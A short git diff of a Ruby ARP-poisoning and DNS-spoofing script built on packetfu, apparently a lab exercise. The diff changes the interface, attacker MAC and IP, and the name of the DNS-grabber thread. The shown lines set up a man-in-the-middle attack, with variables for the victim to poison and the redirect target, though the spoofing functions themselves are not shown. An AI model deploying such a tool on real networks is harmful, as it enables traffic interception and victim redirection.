@@ -4,11 +4,11 @@ require 'packetfu'
 require 'thread'
 require './gdns.rb'
 
-$iface = "p2p1"   # interface to send/recieve from
-$sMac = '08:00:27:5d:d8:c9'  # source mac address, eg, address to redirect victim to
+$iface = "eth0"   # interface to send/recieve from
+$sMac = '08:00:27:48:d2:8f'  # source mac address, eg, address to redirect victim to
 $tMac = '50:e5:49:3a:52:de'  # target mac address, eg, address to poison
 $rMac = '00:24:b2:4d:b9:1d'  # routers mac address
-$sIP = '10.0.0.28'        # source IP address
+$sIP = '10.0.0.68'        # source IP address
 $tIP = '10.0.0.9'        # target IP address
 $rIP = '10.0.0.1'       # router IP address
 
@@ -55,7 +55,7 @@ end
 begin
   start()
   spoof_thread = Thread.new{runSpoof()} 
-  dns_thread = Thread.new{dns_grabber} 
+  dns_thread = Thread.new{dns_query_grabber} 
   spoof_thread.join
   dns_thread.join
 
